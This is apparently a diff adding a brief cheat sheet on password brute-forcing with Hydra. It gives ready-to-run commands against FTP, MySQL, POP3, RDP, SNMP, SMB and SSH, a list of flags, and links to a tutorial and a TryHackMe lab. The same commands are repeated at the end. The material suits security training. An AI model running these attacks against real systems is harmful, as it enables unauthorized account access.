@@ -1,0 +1,36 @@
+1. Brute Force using Hydra
+
+--> hydra -l root -P passwords.txt [-t 32] <IP> ftp
+--> hydra -L usernames.txt -P pass.txt <IP> mysql
+--> hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+
+--> hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+--> hydra -t 4 -V -f -l administrator -P rockyou.txt rdp://192.168.34.16
+
+--> hydra -P common-snmp-community-strings.txt target.com snmp
+--> hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+--> hydra -l root -P passwords.txt <IP> ssh
+
+2. Description 
+
+-l  Single Username
+-L Username list
+-p Password
+-P Password list
+-t Limit concurrent connections
+-V Verbose output
+-f Stop on correct login
+-s Port
+
+3. Reference 
+--> https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/
+--> https://tryhackme.com/room/hydra
+
+
+hydra -l root -P passwords.txt [-t 32] <IP> ftp
+hydra -L usernames.txt -P pass.txt <IP> mysql
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+hydra -P common-snmp-community-strings.txt target.com snmp
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+hydra -l root -P passwords.txt <IP> ssh
